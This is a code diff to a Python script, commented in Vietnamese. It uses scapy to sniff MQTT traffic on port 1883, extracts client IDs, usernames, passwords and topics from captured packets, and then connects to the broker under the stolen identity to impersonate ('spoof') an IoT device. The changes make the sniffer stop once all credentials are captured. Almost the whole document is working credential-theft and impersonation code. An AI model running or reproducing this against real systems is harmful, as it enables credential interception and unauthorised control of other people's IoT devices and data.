@@ -28,11 +28,10 @@ def All(ip, port, interface):
         def filter_mqtt(pkt):
             if pkt.haslayer(Raw):
                 raw_data = pkt[Raw].load
-                return raw_data.startswith(b'\x10') or raw_data.startswith(b'\x82')
+                return raw_data
             return False
 
         def extract_alphanumeric(input_string):
-            # Sử dụng biểu thức chính quy để chỉ lấy các ký tự abc và số
             alphanumeric_only = re.sub(r'[^a-zA-Z0-9]', '', input_string)
             return alphanumeric_only
 
@@ -58,7 +57,7 @@ def All(ip, port, interface):
                             print("Listening, Username, Password:", Client_Id, Username, Password)
                             sys.stdout.flush()
                         else:
-                            print("Error: Not enough elements in values")
+                            print("...............................")
                             sys.stdout.flush()
                     if raw_data.startswith(b'\x82'):
                         raw_data_new = raw_data[:-1]
@@ -68,41 +67,33 @@ def All(ip, port, interface):
                         print("Listening Topic:", Topic)
                         sys.stdout.flush()
                         temp_info1['Topic'] = Topic
-
                 except UnicodeDecodeError:
                     print("Error")
                     sys.stdout.flush()
-    
-    # Bắt và lọc những gói tin MQTT Connect Command và Subscribe Request
-        sniff(iface=interface, filter="tcp port 1883",
-            prn=decode_mqtt_raw, lfilter=filter_mqtt, count=1000)#count=2
 
+        def stop_sniffing(pkt):
+            return 'Username' in temp_info and 'Password' in temp_info and 'Client_Id' in temp_info and 'Topic' in temp_info1
+        sniff(iface=interface, filter="tcp port 1883",
+            prn=decode_mqtt_raw, lfilter=filter_mqtt, stop_filter=stop_sniffing, count=1000)#count=2
+        # Hàm giả mạo thiết bị IOT tại đây
         def spoofingIOT(Client_Id,Username, Password, Topic):
             client = mqtt.Client(Client_Id)
-            # Hàm giả mạo thiết bị IOT tại đây
-
             def on_connect(client, userdata, flags, rc):
                 if rc == 0:
                     client.subscribe(Topic)  # Đăng ký (subscribe) vào chủ đề "lolotica" khi kết nối thành công
                 else:
                     print("Connection failed")
                     sys.stdout.flush()
-
             def on_message(client, userdata, message):
-            
                 print("Spoofing Received message:", message.payload.decode())
                 sys.stdout.flush()
-                # if message.payload:
-                #     print("Data received. Stopping the program.")
-                #     sys.stdout.flush()
-                #     client.disconnect()  # Ngắt kết nối khi có dữ liệu
-                #     exit()  # Kết thúc chương trình
-
             client.on_connect = on_connect
             client.on_message = on_message
             client.username_pw_set(Username, Password)  # Thiết lập thông tin đăng nhập
             client.connect(ip, port)  # Kết nối tới broker MQTT
             client.loop_forever()
+
+           #Khi có đầy đủ các tham số mới bắt đầu chạy 
         if(temp_info1.get('Topic') and temp_info.get('Username') and temp_info.get('Password') and temp_info.get('Client_Id')):
             spoofingIOT(temp_info['Client_Id'],temp_info['Username'],
                         temp_info['Password'], temp_info1['Topic'])
